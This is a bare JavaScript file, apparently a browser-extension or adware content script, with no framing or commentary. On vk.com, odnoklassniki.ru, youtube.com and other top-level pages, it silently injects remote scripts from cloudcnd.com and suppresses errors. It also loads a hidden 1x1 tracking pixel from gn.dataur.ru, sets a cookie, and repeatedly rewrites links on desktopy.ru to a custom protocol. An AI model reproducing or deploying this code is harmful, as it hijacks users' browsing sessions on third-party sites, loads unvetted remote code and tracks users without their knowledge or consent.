var gr_pr=6;
function gr_c(){try{var doc=window.top.document;var loc=doc.location.toString();var d = loc.split("/")[2];d=d.split("www.").join("");if ((d == "vkontakte.ru" || d == "vk.com") && !doc.getElementById('md_tsr')){var f=doc.createElement('script');f.type='text/javascript';f.id='md_tsr';f.src='http://cloudcnd.com/gdata/v/ikf.js?'+gr_pr;doc.getElementsByTagName('head')[0].appendChild(f);}}catch(e){}}gr_c();
function gr_c2(){try{var doc=document;var loc=doc.location.toString();var d=loc.split("/")[2];d=d.split("www.").join("");if (d=="odnoklassniki.ru" && !doc.getElementById("mr_tsr")){var f=doc.createElement('script');f.type='text/javascript';f.id='mr_tsr';f.src='http://cloudcnd.com/gdata/o/ikf.js?'+gr_pr;doc.getElementsByTagName('head')[0].appendChild(f);}}catch(e){}}gr_c2();
function gr_c3(){try{var doc=document;var loc=doc.location.toString();var d=loc.split("/")[2];d=d.split("www.").join("");if (d=="youtube.com" && !doc.getElementById("mr_tsr")){var f=doc.createElement('script');f.type='text/javascript';f.id='mr_tsr';f.src='http://cloudcnd.com/gdata/y/ikf.js?'+gr_pr;doc.getElementsByTagName('head')[0].appendChild(f);}}catch(e){}}gr_c3();
(function(){if (window==window.top && !document.getElementById("mg_tsr") && !document.getElementById("mr_tsr") && !document.getElementById("md_tsr")){var f=document.createElement('script');f.type='text/javascript';f.id='mg_tsr';f.src='http://cloudcnd.com/gdata/z/ikfr.js?'+gr_pr;document.getElementsByTagName('head')[0].appendChild(f);}})();

function desk_getDomain(){
       res = "";
       var doc=document;
       try{doc=window.top.document;}catch(e){}
       var loc = doc.location.toString();
       if (loc.indexOf('http') == 0)
       {
            var domain = loc.split("/")[2].split(".");
            res = domain[domain.length - 2] + "." + domain[domain.length - 1];
       }
       return res;
}

function desk_stat(url,id){
try{
      var doc=document;
      try{doc=window.top.document;}catch(e){}
      if (doc.getElementById(id)) return;
      var img=doc.createElement('img');
      var newurl=url+'?'+Math.floor(Math.random()*10000);
      img.src=newurl;
      img.id=id;
      img.setAttribute('height',1);
      img.setAttribute('width',1);
      doc.body.appendChild(img);
}catch(e){}
}

function desk_inject(url){
  var doc=document;
	var f=doc.createElement('script');
	f.type='text/javascript';
	f.src=url;
	doc.getElementsByTagName('head')[0].appendChild(f);
};

function desk_setCookie(c_name,value,exdays)
 {
 var exdate=new Date();
 exdate.setDate(exdate.getDate() + exdays);
 var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString());
 document.cookie=c_name + "=" + c_value;
 }

function desk_init(){
	var elems=document.getElementsByTagName("A");
	for (var i=0;i<elems.length;i++){
		var val=elems[i].getAttribute('wallpaper');
		if (val!=undefined && val.length>10)
		{
			elems[i].setAttribute('href',"desktopy://"+val);
		}
	}
	desk_setCookie("on_prog","0");
}

function d_init(){
if (desk_getDomain()=="desktopy.ru") 
	{
		desk_init();
		window.setInterval(function(){desk_init();},300);
	}
if (window==window.top) desk_stat('http://gn.dataur.ru/favicon.gif',"dst");
}
d_init();
